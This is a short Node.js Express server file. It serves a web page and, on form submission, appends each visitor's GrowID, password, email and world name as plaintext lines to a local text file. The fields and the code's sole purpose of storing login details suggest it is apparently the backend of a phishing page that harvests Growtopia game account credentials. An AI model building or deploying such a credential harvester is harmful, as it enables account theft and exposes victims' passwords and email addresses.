const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, '..', 'public')));  // Adjust path to serve from root folder

// Middleware to parse JSON data in the body of the request
app.use(bodyParser.json());

// Serve the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));  // Adjust path to serve from root folder
});

// Handle the form submission
app.post('/submit', (req, res) => {
    const { growId, password, email, world } = req.body;

    const userData = `GrowID: ${growId}, Password: ${password}, Email: ${email}, World: ${world}\n`;

    const filePath = path.join(__dirname, '..', 'data', 'userData.txt');

    fs.appendFile(filePath, userData, (err) => {
        if (err) {
            console.error('Error saving user data:', err);
            res.status(500).send('Failed to save user data');
            return;
        }
        res.send('User data saved successfully');
    });
});

// Start the server
app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
